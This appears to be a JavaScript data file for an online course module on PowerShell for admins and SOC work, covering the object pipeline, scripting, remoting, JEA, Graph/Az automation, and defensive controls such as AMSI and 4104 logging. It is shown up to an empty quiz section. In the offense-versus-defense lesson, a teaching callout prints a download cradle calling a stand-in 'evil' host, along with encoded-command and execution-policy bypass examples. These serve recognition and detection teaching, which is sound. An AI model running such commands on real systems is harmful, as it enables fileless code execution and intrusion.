/* Module 7 — PowerShell for Admins & Security
   Format mirrors mod-01.js (the gold-standard template):
   - JS strings use DOUBLE quotes "..."; HTML attributes inside use SINGLE quotes '...'.
   - Code blocks are arrays of lines; Windows paths use DOUBLE backslashes (C:\\Scripts).
   - NO backticks, NO template literals, and NO PowerShell backtick line-continuation.
     Use splatting or one statement per line, or the pipeline instead.
   Block types: p, h, h3, list, olist, steps, quote, divider,
     callout {variant: info|tip|warn|danger|interview|lab|analogy},
     code {lang, caption, code:[...]}, table {headers, rows}, kv {items:[{k,v}]}. */
window.COURSE.modules.push({
  id: "mod-07",
  number: 7,
  icon: "⚡",
  title: "PowerShell for Admins & Security",
  tagline: "The object pipeline, scripting, Graph & Az automation — and the offensive/defensive PowerShell (AMSI, script-block logging) every SOC asks about.",
  estMinutes: 95,
  objectives: [
    "Use the <strong>object pipeline</strong> and the Get-Help / Get-Command / Get-Member discovery trio.",
    "Write basic scripts with variables, loops, functions, and error handling.",
    "Automate Entra and Azure with the <strong>Microsoft Graph PowerShell SDK</strong> and the Az module (knowing MSOnline/AzureAD are retired).",
    "Explain why <strong>Execution Policy is not a security control</strong>, and what AMSI and script-block logging (4104) do.",
    "Write practical security one-liners a SOC engineer actually runs."
  ],
  lessons: [
    /* ---------------------------------------------------------------- */
    {
      id: "7-1",
      title: "Why PowerShell & the object pipeline",
      subtitle: "The single idea that makes everything click",
      blocks: [
        { type: "p", html: "I have written PowerShell since it was a secret project called <em>Monad</em>, and I will tell you the one thing that separates people who <em>use</em> PowerShell from people who <em>get</em> it: <strong>the pipeline passes objects, not text</strong>. In bash, every command spits out a blob of characters and the next command has to re-parse that text with awk, sed, cut, and prayer. In PowerShell, one cmdlet hands the next a fully-formed .NET object with named properties and methods. No parsing. No guessing which column is the PID." },
        { type: "callout", variant: "analogy", html: "<p>Bash piping is like passing someone a <strong>printed receipt</strong> — they have to read it back, find the total, and retype it. PowerShell piping is like passing them the <strong>spreadsheet itself</strong> — they just ask for the <code>Total</code> column. One is fragile string-scraping; the other is structured data.</p>" },
        { type: "h", text: "Verb-Noun: the grammar you can guess" },
        { type: "p", html: "Every cmdlet is named <strong>Verb-Noun</strong> from a controlled vocabulary: <code>Get-Process</code>, <code>Stop-Service</code>, <code>New-Item</code>, <code>Set-MgUser</code>. Once you learn that the approved verbs are things like <code>Get</code>, <code>Set</code>, <code>New</code>, <code>Remove</code>, <code>Start</code>, <code>Stop</code>, you can <em>predict</em> command names you've never seen. That consistency is not cosmetic — it is why discovery (next lesson) actually works." },
        { type: "code", lang: "powershell", caption: "The pipeline passes objects — watch what you can do without parsing text", code: [
          "# Get processes, keep only big ones, sort, take top 5 — no text parsing at all",
          "Get-Process |",
          "  Where-Object { $_.WorkingSet -gt 100MB } |",
          "  Sort-Object WorkingSet -Descending |",
          "  Select-Object -First 5 Name, Id, @{ n='RAM(MB)'; e={ [math]::Round($_.WorkingSet/1MB) } }",
          "",
          "# Because these are objects, you can pipe straight into structured exports",
          "Get-Service | Where-Object Status -eq 'Running' | Export-Csv C:\\Temp\\services.csv -NoTypeInformation"
        ]},
        { type: "h", text: "Two editions you must distinguish" },
        { type: "table", headers: ["", "Windows PowerShell 5.1", "PowerShell 7 (current)"], rows: [
          ["Runtime", "Built on .NET Framework", "Built on modern .NET (cross-platform)"],
          ["Platform", "Windows only; ships in-box with Windows", "Windows, Linux, macOS — installed separately"],
          ["Executable", "<code>powershell.exe</code>", "<code>pwsh.exe</code> / <code>pwsh</code>"],
          ["Status", "Last Windows-only version; still shipped, only bug/security fixes", "Where all new development happens — use this"],
          ["Both installed?", "Yes — they coexist side by side on a Windows box", "Yes — same machine, separate engines"]
        ]},
        { type: "callout", variant: "warn", html: "<p>They <strong>coexist</strong>. <code>powershell.exe</code> launches 5.1; <code>pwsh.exe</code> launches 7. This matters in security work: an attacker may invoke whichever one is logged less, and some old admin modules only load in 5.1. Always know which engine you (and your suspect process) are running — check <code>$PSVersionTable</code>.</p>" },
        { type: "callout", variant: "interview", html: "<p><strong>Q: “What is the single biggest difference between the PowerShell pipeline and a Unix/bash pipeline?”</strong> PowerShell passes <strong>structured .NET objects</strong> between cmdlets, while bash passes <strong>unstructured text</strong>. That means PowerShell never needs <code>awk</code>/<code>cut</code> to re-parse columns — you filter and select on real named properties. It is the killer feature, and saying it crisply marks you as someone who has actually used the language.</p>" }
      ]
    },
    /* ---------------------------------------------------------------- */
    {
      id: "7-2",
      title: "Core skills: discovery & the pipeline",
      blocks: [
        { type: "p", html: "You will never memorise every cmdlet, and you should not try. What you must master is <strong>discovery</strong> — the ability to teach yourself any command live. I have walked into environments with custom modules I'd never seen and been productive in minutes using just three commands." },
        { type: "h", text: "The discovery trio" },
        { type: "kv", items: [
          { k: "Get-Command", v: "<em>What can I run?</em> Finds cmdlets/functions, e.g. <code>Get-Command *user* -Module Microsoft.Graph.Users</code>." },
          { k: "Get-Help", v: "<em>How do I use it?</em> Syntax, parameters, and crucially <code>-Examples</code>. Run <code>Update-Help</code> once to download the full text." },
          { k: "Get-Member", v: "<em>What does this object actually contain?</em> Lists every property and method. This is the one juniors skip and seniors live by." }
        ]},
        { type: "callout", variant: "tip", html: "<p><code>Get-Member</code> is your X-ray. Pipe ANY object into it — <code>Get-Process | Get-Member</code> — and you see every property you can <code>Select-Object</code> and every method you can call. When someone asks “how did you know that property existed?”, the honest answer is always “I piped it to Get-Member.”</p>" },
        { type: "h", text: "The pipeline workhorses" },
        { type: "table", headers: ["Cmdlet", "Alias", "What it does"], rows: [
          ["<code>Select-Object</code>", "select", "Pick which properties (or first/last N) to keep"],
          ["<code>Where-Object</code>", "where / ?", "Filter rows by a condition"],
          ["<code>ForEach-Object</code>", "foreach / %", "Run code against each item in the pipeline"],
          ["<code>Sort-Object</code>", "sort", "Order by one or more properties"],
          ["<code>Group-Object</code>", "group", "Bucket items by a property (great for counting)"],
          ["<code>Measure-Object</code>", "measure", "Count / sum / average a property"]
        ]},
        { type: "p", html: "Inside a script block, <code>$_</code> (or its named equivalent <code>$PSItem</code>) is <strong>the current object flowing down the pipeline</strong>. <code>$_.Status</code> means “the Status property of the thing I'm looking at right now.”" },
        { type: "code", lang: "powershell", caption: "Discovery + the workhorses in one real example", code: [
          "# 1) Discover: what commands touch services?",
          "Get-Command -Noun Service",
          "",
          "# 2) Inspect: what properties does a service object expose?",
          "Get-Service | Get-Member -MemberType Property",
          "",
          "# 3) Use it: how many services are in each state? (Group + count)",
          "Get-Service | Group-Object Status | Select-Object Name, Count",
          "",
          "# 4) Filter + sort + measure in one go",
          "Get-Process |",
          "  Where-Object { $_.CPU -gt 10 } |",
          "  Sort-Object CPU -Descending |",
          "  Measure-Object -Property CPU -Sum"
        ]},
        { type: "h", text: "Providers — the file system isn't special" },
        { type: "p", html: "A brilliant design choice: PowerShell exposes many data stores as <strong>drives</strong> you navigate exactly like <code>C:\\</code>. The registry, certificate store, and environment variables are all just providers. <code>cd</code>, <code>dir</code>, and <code>Get-ChildItem</code> work on all of them." },
        { type: "code", lang: "powershell", caption: "Providers: registry and cert store as drives", code: [
          "# The registry is a drive — browse persistence keys like folders",
          "Get-ChildItem 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
          "",
          "# The certificate store is a drive too — find certs expiring soon",
          "Get-ChildItem Cert:\\LocalMachine\\My |",
          "  Where-Object { $_.NotAfter -lt (Get-Date).AddDays(30) }",
          "",
          "# Environment variables, also a provider",
          "Get-ChildItem Env:\\ | Where-Object Name -like 'COMPUTER*'"
        ]},
        { type: "callout", variant: "lab", html: "<p>Open PowerShell and run <code>Get-Service | Get-Member</code>. Find a property you didn't know existed (try <code>StartType</code> or <code>DependentServices</code>), then build a one-liner that uses it. Repeat the habit with <code>Get-Process</code> and <code>Get-ChildItem</code>. Twenty minutes of this is worth more than memorising a cheat sheet.</p>" },
        { type: "callout", variant: "interview", html: "<p><strong>Q: “You're handed an unfamiliar object from some cmdlet. How do you figure out what you can do with it?”</strong> Pipe it to <strong><code>Get-Member</code></strong> to enumerate its properties and methods, use <strong><code>Get-Command</code></strong> to find related cmdlets, and <strong><code>Get-Help -Examples</code></strong> for usage. Naming Get-Member specifically is the tell that you actually work this way day to day.</p>" }
      ]
    },
    /* ---------------------------------------------------------------- */
    {
      id: "7-3",
      title: "Scripting: variables, logic, functions & error handling",
      blocks: [
        { type: "p", html: "One-liners get you through the day; <strong>scripts</strong> get you promoted. The moment you wrap repeatable logic into a function with proper error handling, you stop being someone who runs commands and become someone who builds tools. Let's cover the building blocks the way I'd teach a new hire." },
        { type: "h", text: "Variables, types & comparison operators" },
        { type: "p", html: "Variables start with <code>$</code>. PowerShell infers types but you can pin them: <code>[int]$count = 5</code>. The operators trip up everyone coming from C-style languages — there is no <code>==</code>; comparisons are word-style:" },
        { type: "table", headers: ["Operator", "Meaning", "Example"], rows: [
          ["<code>-eq</code> / <code>-ne</code>", "equals / not equals", "<code>$x -eq 5</code>"],
          ["<code>-gt</code> / <code>-lt</code> / <code>-ge</code> / <code>-le</code>", "greater / less than (or equal)", "<code>$age -ge 18</code>"],
          ["<code>-like</code>", "wildcard match (<code>*</code>, <code>?</code>)", "<code>$name -like 'adm*'</code>"],
          ["<code>-match</code>", "regular-expression match", "<code>$log -match 'fail(ed)?'</code>"],
          ["<code>-contains</code> / <code>-in</code>", "collection membership", "<code>$admins -contains $user</code>"]
        ]},
        { type: "callout", variant: "warn", html: "<p>Comparisons are <strong>case-insensitive by default</strong>. <code>'ABC' -eq 'abc'</code> is <code>$true</code>. Prefix with <code>c</code> for case-sensitive (<code>-ceq</code>, <code>-cmatch</code>). In a security script that compares hashes or tokens, the difference between <code>-eq</code> and <code>-ceq</code> can be the difference between a correct and a dangerously wrong result.</p>" },
        { type: "h", text: "Flow control & loops" },
        { type: "p", html: "<code>if</code>/<code>elseif</code>/<code>else</code> and <code>switch</code> for branching; <code>foreach</code>, <code>for</code>, and <code>while</code> for loops. Note the difference between the <code>foreach</code> <em>statement</em> (loops over a collection in memory) and the <code>ForEach-Object</code> <em>cmdlet</em> (processes the pipeline item-by-item)." },
        { type: "h", text: "Functions with param() blocks & error handling" },
        { type: "p", html: "A real function declares its inputs in a <code>param()</code> block (with types and validation), handles errors with <code>try</code>/<code>catch</code>/<code>finally</code>, and carries <strong>comment-based help</strong> so the next engineer can <code>Get-Help</code> it. Here is a small, reusable one I'd actually keep in my toolkit:" },
        { type: "code", lang: "powershell", caption: "A reusable, defensible function (the senior pattern)", code: [
          "function Test-PortOpen {",
          "    <#",
          "    .SYNOPSIS",
          "        Tests whether a TCP port is reachable on a host.",
          "    .EXAMPLE",
          "        Test-PortOpen -ComputerName dc01 -Port 3389",
          "    #>",
          "    [CmdletBinding()]",
          "    param(",
          "        [Parameter(Mandatory)][string]$ComputerName,",
          "        [Parameter(Mandatory)][int]$Port",
          "    )",
          "    try {",
          "        $result = Test-NetConnection -ComputerName $ComputerName -Port $Port -ErrorAction Stop",
          "        [pscustomobject]@{",
          "            Computer = $ComputerName",
          "            Port     = $Port",
          "            Open     = $result.TcpTestSucceeded",
          "        }",
          "    }",
          "    catch {",
          "        Write-Warning \"Failed to test $ComputerName : $($_.Exception.Message)\"",
          "    }",
          "    finally {",
          "        Write-Verbose 'Port test complete.'",
          "    }",
          "}"
        ]},
        { type: "callout", variant: "tip", title: "The golden error-handling rule", html: "<p><code>try</code>/<code>catch</code> only fires for <strong>terminating</strong> errors. Most cmdlets throw <em>non-terminating</em> errors that sail right past <code>catch</code>. Force them to terminate with <code>-ErrorAction Stop</code> on the cmdlet (or set <code>$ErrorActionPreference = 'Stop'</code> for the scope). Forget this and your <code>catch</code> block is decorative.</p>" },
        { type: "h", text: "Modules from the PowerShell Gallery" },
        { type: "p", html: "Functionality ships as <strong>modules</strong>. Install from the public PowerShell Gallery (PSGallery) with <code>Install-Module</code>:" },
        { type: "code", lang: "powershell", caption: "Installing and trusting modules", code: [
          "# Install for just your user (no admin needed)",
          "Install-Module Microsoft.Graph -Scope CurrentUser",
          "",
          "# See what's installed and import on demand",
          "Get-Module -ListAvailable Microsoft.Graph*",
          "Import-Module Microsoft.Graph.Users"
        ]},
        { type: "callout", variant: "danger", html: "<p>The Gallery is open to <strong>anyone</strong>. Typo-squatted and malicious modules are a real supply-chain risk. Verify the publisher, pin versions, prefer Microsoft-signed modules, and in a managed environment host an <strong>internal, vetted repository</strong> rather than installing straight from the internet on production servers.</p>" },
        { type: "callout", variant: "interview", html: "<p><strong>Q: “Your try/catch isn't catching an error — why?”</strong> Because the cmdlet raised a <strong>non-terminating</strong> error, and <code>catch</code> only handles <strong>terminating</strong> ones. Add <code>-ErrorAction Stop</code> (or set <code>$ErrorActionPreference='Stop'</code>) to promote it. This is the most common scripting bug interviewers probe, and the precise vocabulary — terminating vs non-terminating — is what they're listening for.</p>" }
      ]
    },
    /* ---------------------------------------------------------------- */
    {
      id: "7-4",
      title: "Remoting & administering at scale",
      blocks: [
        { type: "p", html: "The reason PowerShell rules enterprise admin is that you can run the same code against <strong>one machine or ten thousand</strong> with almost no change. The plumbing underneath is <strong>WinRM</strong> (Windows Remote Management), the WS-Management implementation that PowerShell Remoting rides on." },
        { type: "h", text: "Two ways to reach a remote box" },
        { type: "kv", items: [
          { k: "Enter-PSSession", v: "<strong>Interactive, one machine.</strong> Drops you into a live remote prompt, like SSH. Great for hands-on troubleshooting." },
          { k: "Invoke-Command", v: "<strong>Fan-out, many machines, in parallel.</strong> Runs a script block on every computer you list and brings the objects back. This is the workhorse." },
          { k: "PSSession", v: "A <strong>persistent</strong> connection object (<code>New-PSSession</code>) you reuse across commands so you don't re-authenticate each time." },
          { k: "PowerShell Direct", v: "Run commands <strong>into a Hyper-V VM</strong> from the host over the VMBus — no network, no WinRM. Lifesaver when a VM's networking is broken." }
        ]},
        { type: "code", lang: "powershell", caption: "Fan-out execution across many servers", code: [
          "# Interactive session to a single server",
          "Enter-PSSession -ComputerName DC01",
          "",
          "# Run the SAME query on many servers at once; results come back as objects",
          "$servers = 'WEB01','WEB02','WEB03'",
          "Invoke-Command -ComputerName $servers -ScriptBlock {",
          "    Get-Service -Name 'W3SVC' | Select-Object MachineName, Status",
          "}",
          "",
          "# Reuse a persistent session for several commands",
          "$s = New-PSSession -ComputerName DB01",
          "Invoke-Command -Session $s -ScriptBlock { Get-MpComputerStatus }",
          "Remove-PSSession $s",
          "",
          "# PowerShell Direct into a VM (run from the Hyper-V host)",
          "Invoke-Command -VMName 'Lab-Win11' -Credential (Get-Credential) -ScriptBlock { hostname }"
        ]},
        { type: "callout", variant: "tip", html: "<p>Notice <code>Invoke-Command</code> returns objects with a <code>PSComputerName</code> property auto-added, so you always know which machine each result came from. That is the object pipeline paying off at scale — try doing that cleanly by parsing SSH text output across 300 hosts.</p>" },
        { type: "h", text: "Just Enough Administration (JEA)" },
        { type: "p", html: "Here is the security crown jewel of remoting. Normally, giving someone remote admin means handing over a full administrator shell — a huge attack surface. <strong>JEA</strong> lets you publish a <em>constrained endpoint</em>: a connection that runs as a privileged virtual account but only exposes a <strong>specific allow-list of commands</strong> the user may run, with every action logged." },
        { type: "table", headers: ["JEA gives you", "Why it matters for security"], rows: [
          ["Role-limited command set", "Helpdesk can restart a service but cannot read LSASS or add users"],
          ["Runs as a virtual / managed account", "The user never holds the admin credential themselves"],
          ["Full transcription of every session", "Complete audit trail of who ran what, when"],
          ["No interactive admin logon needed", "Shrinks the number of standing privileged accounts"]
        ]},
        { type: "callout", variant: "analogy", html: "<p>JEA is the difference between giving a contractor the <strong>master key to the whole building</strong> and giving them a <strong>keycard that opens only Room 204, only on weekdays, with the door camera recording</strong>. Same task gets done; the blast radius if they're compromised is tiny.</p>" },
        { type: "callout", variant: "interview", html: "<p><strong>Q: “How would you let a helpdesk team restart a service on production servers without making them administrators?”</strong> Publish a <strong>JEA</strong> endpoint with a role capability that allows only the <code>Restart-Service</code> cmdlet (optionally pinned to specific service names), running under a virtual privileged account, with session transcription enabled. You get least privilege <em>and</em> a full audit trail — textbook constrained, auditable delegation.</p>" }
      ]
    },
    /* ---------------------------------------------------------------- */
    {
      id: "7-5",
      title: "PowerShell for the Microsoft cloud (Graph & Az)",
      blocks: [
        { type: "p", html: "Cloud identity and resources are run from PowerShell every single day. But the landscape changed recently, and interviewers <em>love</em> to catch people quoting dead modules. Let me be blunt about what's current and what's a corpse." },
        { type: "callout", variant: "danger", title: "These modules are RETIRED — do not use them", html: "<p>The legacy <strong>MSOnline</strong> (the old <code>Msol*</code> cmdlets) and <strong>AzureAD</strong> (the <code>AzureAD*</code> cmdlets) PowerShell modules were <strong>retired in 2025</strong>. They no longer receive updates and are being deprecated against the underlying APIs. Their replacement for identity is the <strong>Microsoft Graph PowerShell SDK</strong>. If you see <code>Connect-MsolService</code> or <code>Get-AzureADUser</code> in a script, that script is legacy — flag it for migration.</p>" },
        { type: "h", text: "The current toolkit" },
        { type: "kv", items: [
          { k: "Microsoft Graph PowerShell SDK", v: "<code>Connect-MgGraph</code> and the <code>*-Mg*</code> cmdlets. Manages Entra ID users, groups, devices, policies, sign-in/audit data. <strong>Replaces MSOnline and AzureAD.</strong>" },
          { k: "Az module", v: "<code>Connect-AzAccount</code> and <code>*-Az*</code> cmdlets. Manages <strong>Azure resources</strong> — VMs, storage, RBAC role assignments, networking." },
          { k: "ExchangeOnlineManagement", v: "<code>Connect-ExchangeOnline</code>. Mailboxes, mail flow, anti-phishing/transport rules in Exchange Online." }
        ]},
        { type: "h", text: "Scopes & consent — least privilege in the cloud" },
        { type: "p", html: "Graph uses OAuth: when you call <code>Connect-MgGraph</code> you request <strong>scopes</strong> (permissions) and consent to exactly what you need. Asking for read-only scopes when you only read is least privilege in action — and a great thing to say out loud in an interview." },
        { type: "code", lang: "powershell", caption: "Microsoft Graph SDK — connect, query, and a couple of real admin one-liners", code: [
          "# Connect requesting only the scopes you need (you'll consent in the browser)",
          "Connect-MgGraph -Scopes 'User.Read.All','User.ReadWrite.All','AuditLog.Read.All'",
          "",
          "# Read users",
          "Get-MgUser -Filter \"accountEnabled eq true\" -Top 10 | Select-Object DisplayName, UserPrincipalName",
          "",
          "# Disable a user account (e.g. on offboarding / suspected compromise)",
          "Update-MgUser -UserId 'jdoe@contoso.com' -AccountEnabled:$false",
          "",
          "# Inspect a group's membership",
          "Get-MgGroupMember -GroupId (Get-MgGroup -Filter \"displayName eq 'Finance'\").Id",
          "",
          "# Find users WITHOUT a strong MFA method registered (a classic audit ask)",
          "Get-MgUser -All | ForEach-Object {",
          "    $methods = Get-MgUserAuthenticationMethod -UserId $_.Id",
          "    $hasMfa  = $methods.AdditionalProperties.'@odata.type' -match 'microsoftAuthenticator|fido2|phone'",
          "    if (-not $hasMfa) { $_.UserPrincipalName }",
          "}"
        ]},
        { type: "code", lang: "powershell", caption: "Az module — Azure resources and RBAC", code: [
          "Connect-AzAccount",
          "",
          "# Inventory every resource in the tenant",
          "Get-AzResource | Select-Object Name, ResourceType, ResourceGroupName",
          "",
          "# Who has what role where? (privilege review — high-value for security)",
          "Get-AzRoleAssignment | Select-Object DisplayName, RoleDefinitionName, Scope |",
          "  Where-Object RoleDefinitionName -eq 'Owner'"
        ]},
        { type: "callout", variant: "tip", html: "<p>For unattended automation (runbooks, pipelines) do <strong>not</strong> store a password. Use a <strong>managed identity</strong> or an app registration with a <strong>certificate</strong> via <code>Connect-MgGraph -Identity</code> or app-only auth. Interactive consent is for humans; secrets-in-scripts is how breaches start.</p>" },
        { type: "callout", variant: "interview", html: "<p><strong>Q: “We have old scripts using the MSOnline and AzureAD modules — what do you do?”</strong> Both were <strong>retired in 2025</strong>; migrate them to the <strong>Microsoft Graph PowerShell SDK</strong> (<code>Connect-MgGraph</code> / <code>*-Mg*</code> cmdlets), requesting only the Graph scopes each script needs. Mentioning the retirement <em>and</em> the least-privilege scope model is exactly what a current cloud-identity engineer should say.</p>" }
      ]
    },
    /* ---------------------------------------------------------------- */
    {
      id: "7-6",
      title: "PowerShell security: offense vs defense",
      blocks: [
        { type: "p", html: "This lesson is where SOC interviews live. PowerShell is a power tool, and like any power tool it cuts both ways. You must be able to explain <em>why attackers love it</em> and <em>exactly which controls catch them</em> — in that order, because defenders who don't understand the offense build useless defenses." },
        { type: "h", text: "Why attackers love PowerShell" },
        { type: "list", items: [
          "It is a <strong>signed, trusted, built-in binary</strong> (a “LOLBin” — living-off-the-land binary). It's already on every Windows box, so they don't drop a flagged executable.",
          "It runs code <strong>in memory / fileless</strong> — no malicious file on disk for AV to scan.",
          "It speaks directly to <strong>.NET and the Windows API</strong>, so almost anything is reachable.",
          "It blends in: admins legitimately run PowerShell all day, so the noise hides the signal."
        ]},
        { type: "callout", variant: "danger", title: "Offensive techniques you must recognise (to defend, not do)", html: "<p><strong>Download cradle:</strong> <code>IEX (New-Object Net.WebClient).DownloadString('http://evil/x')</code> pulls a script from the internet and executes it straight in memory.<br><strong>Encoded commands:</strong> <code>powershell -EncodedCommand &lt;base64&gt;</code> (alias <code>-enc</code>) hides the real command as Base64 to dodge eyeballs and naive string-matching.<br><strong>Obfuscation:</strong> string concatenation, case-mangling, and tools that mutate scripts so signatures miss them. Seeing any of these in a process command line is a screaming red flag.</p>" },
        { type: "h", text: "AMSI — the in-memory scanner" },
        { type: "p", html: "The <strong>Antimalware Scan Interface (AMSI)</strong> is a Windows interface that lets PowerShell (and other script hosts) submit code to the registered antivirus — Microsoft Defender — for inspection <em>right before it executes</em>, even if that code was decoded or downloaded purely in memory. AMSI is precisely the answer to “how do you scan fileless scripts?” Attackers know it works, so a huge amount of offensive effort goes into <strong>AMSI bypasses</strong> (patching the AMSI function in memory, etc.). When you hear “AMSI bypass” in a report, read it as “they were trying to run a script Defender would have caught.”" },
        { type: "callout", variant: "warn", title: "Execution Policy is NOT a security boundary", html: "<p>Say this out loud in interviews: <strong>Execution Policy is not a security control.</strong> It exists to stop users accidentally double-clicking a script, not to stop attackers. It is trivially bypassed — <code>powershell -ExecutionPolicy Bypass -File x.ps1</code>, piping a script into stdin, or <code>-EncodedCommand</code> all sidestep it. Microsoft itself documents it as a safety/convenience feature, not a wall. Anyone who calls it a security feature outs themselves as a beginner.</p>" },
        { type: "h", text: "The real defenses (this is what gets logged)" },
        { type: "table", headers: ["Control", "What it does", "Key signal / Event ID"], rows: [
          ["<strong>Script Block Logging</strong>", "Records the actual code that ran — even de-obfuscated/decoded", "<strong>Event ID 4104</strong> (Microsoft-Windows-PowerShell/Operational)"],
          ["<strong>Module Logging</strong>", "Logs pipeline execution details per module", "Event ID 4103"],
          ["<strong>Transcription</strong>", "Writes a full text transcript of every session to a file", "Transcript files on disk / write-only share"],
          ["<strong>AMSI + Defender</strong>", "Scans script content in memory at execution time", "Defender detections / blocks"],
          ["<strong>Constrained Language Mode</strong>", "Strips dangerous language features (no arbitrary .NET / Add-Type)", "Pairs with WDAC; neuters most attack scripts"],
          ["<strong>Code signing</strong>", "Requires scripts to be signed (AllSigned policy)", "Catches unsigned/tampered scripts"],
          ["<strong>WDAC / App Control</strong>", "Allow-lists what code can run; forces Constrained Language Mode", "Blocks unapproved scripts/binaries outright"]
        ]},
        { type: "code", lang: "powershell", caption: "Turn on the logging that catches malicious PowerShell", code: [
          "# Enable Script Block Logging (Event ID 4104) via the registry / Group Policy",
          "$key = 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'",
          "New-Item $key -Force | Out-Null",
          "Set-ItemProperty -Path $key -Name 'EnableScriptBlockLogging' -Value 1",
          "",
          "# Read recent script-block events (this is where you HUNT)",
          "Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104 } -MaxEvents 20 |",
          "  Select-Object TimeCreated, Message",
          "",
          "# Check what language mode you're in (Full vs ConstrainedLanguage)",
          "$ExecutionContext.SessionState.LanguageMode"
        ]},
        { type: "callout", variant: "tip", html: "<p><strong>Constrained Language Mode</strong> is the underrated hero. It blocks the .NET tricks (<code>Add-Type</code>, arbitrary COM, Win32 API calls) that nearly every offensive script needs, while leaving normal admin cmdlets working. WDAC turns it on automatically. Defense in depth: WDAC restricts <em>what</em> runs, CLM restricts <em>what scripts can do</em>, and 4104 logging records <em>everything</em> that ran.</p>" },
        { type: "callout", variant: "interview", html: "<p><strong>Q: “Which log catches a Base64-encoded, in-memory PowerShell payload after it's decoded?”</strong> <strong>Script Block Logging — Event ID 4104</strong> in the PowerShell/Operational channel. It records the de-obfuscated script <em>as actually executed</em>, so even an <code>-EncodedCommand</code> or a download cradle shows up in cleartext. Pair it with Module Logging (4103), Transcription, and AMSI. And remember: Execution Policy stops none of this — it is not a security boundary.</p>" }
      ]
    },
    /* ---------------------------------------------------------------- */
    {
      id: "7-7",
      title: "Practical security scripts you'll actually run",
      blocks: [
        { type: "p", html: "Let's land the plane with snippets I genuinely keep on hand. These are the kinds of short, correct, runnable scripts a SOC or IT-security engineer fires off during triage and audits. Read them, run them in a lab, and make them yours." },
        { type: "h", text: "1) Enumerate local administrators" },
        { type: "p", html: "Unexpected members of the local Administrators group are a classic persistence/privilege-escalation finding. First thing I check on a suspect box." },
        { type: "code", lang: "powershell", caption: "Who is a local admin on this machine?", code: [
          "Get-LocalGroupMember -Group 'Administrators' |",
          "  Select-Object Name, PrincipalSource, ObjectClass",
          "",
          "# Run it across many machines (objects come back tagged with PSComputerName)",
          "Invoke-Command -ComputerName WS01,WS02 -ScriptBlock {",
          "    Get-LocalGroupMember -Group 'Administrators' | Select-Object Name",
          "}"
        ]},
        { type: "h", text: "2) Pull recent failed logons (Event 4625)" },
        { type: "p", html: "A spike in failed logons is the fingerprint of password spraying or brute force. Surfacing the target account and source quickly is bread-and-butter triage." },
        { type: "code", lang: "powershell", caption: "Recent failed logons, grouped by account", code: [
          "Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4625 } -MaxEvents 200 |",
          "  ForEach-Object {",
          "      [pscustomobject]@{",
          "          Time   = $_.TimeCreated",
          "          Target = $_.Properties[5].Value",
          "          Source = $_.Properties[19].Value",
          "      }",
          "  } |",
          "  Group-Object Target |",
          "  Sort-Object Count -Descending |",
          "  Select-Object Name, Count"
        ]},
        { type: "h", text: "3) Check Microsoft Defender status" },
        { type: "p", html: "Before you trust anything else on an endpoint, confirm the AV is actually healthy. Disabled real-time protection or stale signatures is itself an incident." },
        { type: "code", lang: "powershell", caption: "Is Defender healthy and untampered?", code: [
          "Get-MpComputerStatus |",
          "  Select-Object AMRunningMode,",
          "                RealTimeProtectionEnabled,",
          "                IsTamperProtected,",
          "                AntivirusSignatureAge,",
          "                AntivirusSignatureLastUpdated",
          "",
          "# What has Defender detected recently?",
          "Get-MpThreatDetection | Select-Object InitialDetectionTime, ThreatID, Resources"
        ]},
        { type: "h", text: "4) Find stale / disabled accounts (Active Directory)" },
        { type: "p", html: "Dormant accounts are unmonitored doors. This lists enabled accounts that haven't logged on in 90 days — perfect for an access-review or offboarding cleanup." },
        { type: "code", lang: "powershell", caption: "Stale enabled accounts (ActiveDirectory module)", code: [
          "$cutoff = (Get-Date).AddDays(-90)",
          "Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly |",
          "  Where-Object Enabled -eq $true |",
          "  Select-Object Name, SamAccountName, LastLogonDate |",
          "  Sort-Object LastLogonDate",
          "",
          "# Cloud equivalent: risky/old sign-ins via Graph",
          "# (requires AuditLog.Read.All scope from the previous lesson)",
          "Get-MgAuditLogSignIn -Top 50 |",
          "  Where-Object { $_.RiskLevelDuringSignIn -ne 'none' } |",
          "  Select-Object CreatedDateTime, UserPrincipalName, IpAddress, RiskLevelDuringSignIn"
        ]},
        { type: "callout", variant: "lab", html: "<p>In a VM, deliberately fail a few logons (lock yourself out briefly), then run snippet #2 and confirm your bad attempts appear, grouped by account. Next run snippet #1 and add a throwaway local account to Administrators, re-run, and watch it show up. Cause-and-effect like this is how detections stop being abstract.</p>" },
        { type: "callout", variant: "interview", html: "<p><strong>Q: “Walk me through a quick PowerShell triage of a possibly-compromised Windows host.”</strong> Local admins (<code>Get-LocalGroupMember</code>), failed/odd logons (4625/4624), Defender health (<code>Get-MpComputerStatus</code>) and recent detections, persistence in Run keys and scheduled tasks, and the PowerShell script-block log (<strong>4104</strong>) for any encoded or download-cradle activity. Then I'd preserve volatile data before it's lost. Naming the exact cmdlets and Event IDs is what turns a vague answer into a credible one.</p>" },
        { type: "divider" },
        { type: "callout", variant: "tip", title: "Module 7 — Key takeaways", html: "<ul><li>The pipeline passes <strong>objects, not text</strong> — the one idea that defines PowerShell and the #1 interview point versus bash.</li><li>Master <strong>discovery</strong>: <code>Get-Command</code>, <code>Get-Help</code>, and especially <strong><code>Get-Member</code></strong> to inspect any object.</li><li>Use <strong>PowerShell 7 (<code>pwsh</code>)</strong> for new work; Windows PowerShell 5.1 still ships and the two coexist.</li><li>Scale with <strong>Invoke-Command</strong> fan-out; delegate safely with <strong>JEA</strong> (constrained, least-privilege, audited).</li><li>Cloud is the <strong>Microsoft Graph SDK</strong> (<code>Connect-MgGraph</code>) and <strong>Az</strong> — MSOnline and AzureAD were <strong>retired in 2025</strong>.</li><li>Security: <strong>Execution Policy is NOT a boundary</strong>; the real controls are <strong>AMSI</strong>, <strong>Script Block Logging (4104)</strong>, Module Logging, Transcription, <strong>Constrained Language Mode</strong>, and WDAC.</li></ul>" }
      ]
    }
  ],
  quiz: [
